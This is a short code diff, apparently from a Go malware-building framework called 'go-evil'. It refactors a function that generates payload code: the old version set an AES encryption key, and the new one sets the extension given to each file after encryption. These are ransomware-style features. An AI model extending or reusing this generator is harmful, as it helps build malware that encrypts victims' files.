@@ -1,4 +1,4 @@
-package crypto
+package configuration
 
 import (
 	"fmt"
@@ -7,17 +7,17 @@ import (
 	"github.com/TeamPhoneix/go-evil/utility/tools"
 )
 
-// Sets the aes key used for encrypting
-func set_aes_key(value string, s_json string) ([]string, string) {
+// This functions sets the extension that each file will have after being encrypted
+func Set_extension(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 
-	system_call := "set_aes_key"
+	system_call := "set_extension"
 	value = tools.Erase_delimiter(value, []string{"\""}, -1)
 
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(repr []int){", system_call),
-		"key := spine.alpha.construct_string(repr)",
-		"spine.crypt.set_aes_key(key)",
+		"target := spine.variable.get(spine.alpha.construct_string(repr))",
+		"spine.crypt.extension = target",
 		"}"})
 
 	// Construct our int array
